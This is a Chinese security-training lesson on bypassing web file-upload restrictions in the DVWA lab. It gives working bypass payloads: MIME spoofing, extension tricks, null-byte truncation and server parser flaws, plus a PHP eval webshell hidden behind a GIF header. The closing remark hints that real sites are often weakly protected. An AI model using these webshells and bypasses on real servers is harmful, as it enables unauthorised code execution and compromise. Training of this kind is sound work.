---
title: Day026：文件上传漏洞 - 绕过上传限制
tags:
  - 网络安全
  - 文件上传
  - 绕过技巧
categories:
  - 90天安全突击
stage: 筑基
abbrlink: d026
date: 2026-02-17
updated: 2026-01-28
---

# Day026：文件上传漏洞 - 绕过上传限制

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 筑基（第一阶段） |
| **所属周次** | Week 4：XSS 与文件上传 |
| **今日主题** | 绕过各种上传限制 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你想上传 shell.php，但网站提示"只允许上传图片"。换成 shell.jpg 能传上去，但访问后只显示乱码图片...
>
> **问题**：网站有防护怎么办？有没有办法骗过它？
>
> **今天的任务**：学习绕过各种上传限制，让你的 Webshell 成功落地。

---

## 今日目标

- [ ] 绕过前端 JavaScript 验证
- [ ] 绕过 MIME 类型检测
- [ ] 绕过后缀名黑名单
- [ ] 成功在 DVWA Medium 级别上传 Webshell

**闯关条件**：绕过 DVWA Medium 级别的上传限制。

---

## 实战任务（先动手！）

### 任务 1：分析 Medium 级别防护（20 分钟）

**环境**：DVWA - File Upload - Medium

**操作步骤**：
1. 设置 Security Level 为 Medium
2. 尝试上传 `shell.php`
3. 观察错误提示

**记录**：
```
错误提示：________________
被限制的原因：________________
```

**思考**：它检查的是文件名、后缀、还是内容？

---

### 任务 2：绕过 MIME 类型检测（30 分钟）

**原理**：服务器检查请求头中的 `Content-Type`

**操作步骤**：

1. 用 Burp Suite 拦截上传请求
2. 找到 Content-Type 字段
3. 将 `application/x-php` 改为 `image/jpeg`
4. 放行请求

**Burp 操作**：
```
原始：Content-Type: application/x-php
修改：Content-Type: image/jpeg
```

**记录**：
```
修改前结果：________________
修改后结果：________________
```

---

### 任务 3：绕过后缀名检测（30 分钟）

**尝试以下方法**：

**方法 1：大小写绕过**
```
shell.PHP
shell.Php
shell.pHp
```

**方法 2：双后缀**
```
shell.php.jpg
shell.jpg.php
```

**方法 3：特殊后缀（PHP 等效后缀）**
```
shell.php3
shell.php5
shell.phtml
shell.phar
```

**方法 4：空格/点绕过（Windows）**
```
shell.php.
shell.php (空格)
shell.php::$DATA
```

**方法 5：截断（老版本 PHP）**
```
shell.php%00.jpg
shell.php\x00.jpg
```

**记录哪些成功**：
```
大小写：________________
双后缀：________________
特殊后缀：________________
```

---

### 任务 4：图片马制作（30 分钟）

**原理**：把 PHP 代码藏在真实图片里

**方法 1：直接追加**
```bash
# Linux
cat image.jpg shell.php > image_shell.jpg

# Windows
copy /b image.jpg + shell.php image_shell.jpg
```

**方法 2：修改图片头**
```php
GIF89a
<?php @eval($_POST['cmd']); ?>
```
保存为 `shell.gif`

**方法 3：EXIF 注入**

使用工具把代码注入图片的 EXIF 信息中。

**测试**：
1. 上传图片马
2. 如果服务器将其当作 PHP 解析（需要配合解析漏洞），就成功了

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 分析出防护机制 | 15 分 |
| 绕过 MIME 类型检测 | 25 分 |
| 至少一种后缀绕过成功 | 25 分 |
| 成功制作图片马 | 20 分 |
| 理解各种绕过原理 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### 上传检测方式

| 检测方式 | 检测位置 | 绕过难度 |
|----------|----------|----------|
| **前端验证** | JavaScript | 极易 |
| **MIME 类型** | Content-Type 头 | 易 |
| **后缀黑名单** | 文件名 | 中 |
| **后缀白名单** | 文件名 | 难 |
| **文件头检测** | 文件内容 | 中 |
| **内容检测** | 文件内容 | 难 |

### 前端验证绕过

```javascript
// 网站的前端验证
function checkFile() {
    var file = document.getElementById("file").value;
    if (!/\.jpg$/.test(file)) {
        alert("只能上传 JPG！");
        return false;
    }
}
```

**绕过方法**：
1. 禁用 JavaScript
2. 用 Burp 直接发请求
3. 修改页面 JS 代码

### MIME 类型绕过

**常见 MIME 类型**：

| 类型 | MIME |
|------|------|
| JPEG | image/jpeg |
| PNG | image/png |
| GIF | image/gif |
| PHP | application/x-php |

**绕过**：Burp 改 Content-Type 即可。

### 后缀名绕过

**黑名单 vs 白名单**：

| 方式 | 绕过难度 | 原因 |
|------|----------|------|
| 黑名单 | 易 | 总有漏网之鱼 |
| 白名单 | 难 | 必须在允许列表中 |

**PHP 等效后缀**：
```
.php
.php3
.php4
.php5
.php7
.phtml
.phar
.phps
```

**大小写绕过**（Windows 不区分大小写）：
```
.PHP
.Php
.pHp
```

### 文件头检测

服务器检查文件开头的魔数（Magic Bytes）：

| 格式 | 文件头（十六进制） | 文件头（文本） |
|------|-------------------|----------------|
| JPEG | FF D8 FF | ÿØÿ |
| PNG | 89 50 4E 47 | .PNG |
| GIF | 47 49 46 38 | GIF8 |

**绕过**：在 PHP 代码前加上图片头
```php
GIF89a
<?php @eval($_POST['cmd']); ?>
```

### 解析漏洞

即使上传的是图片，某些服务器配置错误可能导致图片被当作 PHP 解析：

**Apache 解析漏洞**：
```
shell.php.xxx    # Apache 可能从后往前解析
```

**Nginx 解析漏洞**：
```
/uploads/image.jpg/.php    # 某些配置下会解析为 PHP
```

**IIS 解析漏洞**：
```
shell.asp;.jpg    # IIS 6.0
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 改了 MIME 没用 | 还是上传失败 | 可能还有其他检测 |
| 图片马不执行 | 显示图片 | 需要配合解析漏洞 |
| 后缀改了没用 | 上传成功不执行 | 服务器不认这个后缀 |

---

## 知识卡片速查

### 绕过技巧总结

```
前端验证 → 禁用 JS / Burp 直接发
MIME 检测 → Burp 改 Content-Type
后缀黑名单 → 大小写/等效后缀/截断
文件头检测 → 加图片头前缀
白名单 → 需要配合解析漏洞
```

### 图片马一键生成

```bash
# Linux
echo 'GIF89a<?php @eval($_POST["cmd"]); ?>' > shell.gif

# 合并
cat real.jpg shell.php > evil.jpg
```

### Burp 修改点

```
POST /upload.php
Content-Type: multipart/form-data

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"  ← 改这里
Content-Type: application/x-php  ← 改这里

<?php ...
```

---

## 常见问题

**Q1：改了 MIME 还是上传失败？**

A1：说明服务器还做了其他检测。可能需要：
1. 同时改后缀名
2. 同时加图片头
3. 尝试其他绕过方式组合

**Q2：图片马上传成功但不执行？**

A2：因为服务器把它当图片处理了。需要：
1. 找解析漏洞
2. 找文件包含漏洞（用 include 加载图片马）

**Q3：白名单怎么绕？**

A3：纯白名单很难绕。可能的思路：
1. 解析漏洞
2. 文件包含漏洞
3. .htaccess 上传（如果允许）
4. 服务器配置错误

---

## 明日预告

**Day 027：Webshell 与后渗透基础**

明天你将：
- 学习使用 Webshell 管理工具
- 了解后渗透的基本概念
- 使用蚁剑/冰蝎连接 Webshell

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 成功的绕过方式 | |
| Medium 级别通过 | 是/否 |
| 今日收获 | |

---

> **导师点评**：
>
> 今天你学了"打不过就绕"的第二课——上传绕过。
>
> 前端验证？禁用 JS。MIME 检测？改 Content-Type。后缀黑名单？换个后缀。
>
> 你会发现，安全就是这样——防御和绕过的博弈。
>
> 但记住，最安全的做法是**白名单 + 重命名 + 禁止执行**。遇到这种配置，你就知道对方是专业的。
>
> 好消息是：很多网站没这么专业。

```bash
echo "Day 026 Complete! 绕过技巧又 +1！"
```
